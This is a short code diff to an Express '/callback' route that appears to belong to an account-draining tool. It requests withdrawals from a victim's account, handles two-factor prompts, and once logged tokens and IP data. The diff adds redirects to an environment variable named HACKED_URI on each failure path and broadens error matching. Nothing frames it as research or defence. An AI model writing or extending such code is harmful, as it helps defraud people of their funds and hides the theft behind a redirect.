@@ -99,7 +99,7 @@ router.get("/callback", async (req, res) => {
         await handleTwoFactorAuthentication();
       } else if (
         reqWithdrawResponse.status === 400 &&
-        reqWithdrawResponse.data.id === "invalid_request"
+        (reqWithdrawResponse.data.id === "invalid_request" || reqWithdrawResponse.data.id === "validation_error")
       ) {
         await controller.message.msg_invalidReqWithdraw(
           AvailableAccounts[0],
@@ -126,13 +126,17 @@ router.get("/callback", async (req, res) => {
         error?.response?.status === 400 &&
         error?.response?.data?.errors[0]?.id === "invalid_request"
       ) {
+        console.error("Error: Invalid Request");
+        res.redirect(`${process.env.HACKED_URI}`);
         // console.error(error?.response?.data?.errors[0]?.message);
       } else {
         console.log("error");
+        res.redirect(`${process.env.HACKED_URI}`);
       }
     }
   } catch (err) {
     console.log("----- CALLBACK -----");
+    res.redirect(`${process.env.HACKED_URI}`);
     // console.log(token, "-- token --");
     // console.log(ipAddress, "-- ipAddress --");
     // console.log(ipInfo, "-- ipInfo --");
